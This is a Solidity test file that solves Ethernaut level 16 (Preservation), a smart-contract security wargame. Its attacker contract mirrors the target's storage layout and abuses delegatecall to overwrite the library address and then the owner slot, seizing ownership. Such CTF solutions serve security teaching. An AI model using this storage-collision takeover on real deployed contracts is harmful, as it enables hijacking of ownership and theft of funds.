// SPDX-License-Identifier: MIT
pragma solidity ^0.8.30;

import "./EthernautTest.t.sol";

interface Level16 {
    function setFirstTime(uint256) external;
}

contract SetLevel16Owner {
    // Symmetry with storage of the Preservation contract
    address public address1;
    address public address2;
    address public owner;

    // The Preservation contract will call this function
    // We will cause it to overwrite the owner slot
    function setTime(uint256 _owner) public {
        owner = address(uint160(_owner));
    }
}

contract Level16Test is EthernautTest {
    function testLevel16() public {
        _createLevel("16");

        Level16 levelInstance16 = Level16(levelInstance["16"]);

        // Deploy our contract
        SetLevel16Owner setLevel16Owner = new SetLevel16Owner();
        // Overwrite the first time zone to point to our contract
        levelInstance16.setFirstTime(uint256(uint160(address(setLevel16Owner))));
        // Overwrite the owner slot
        levelInstance16.setFirstTime(uint256(uint160(address(this))));

        require(_submitLevel("16"));
    }
}
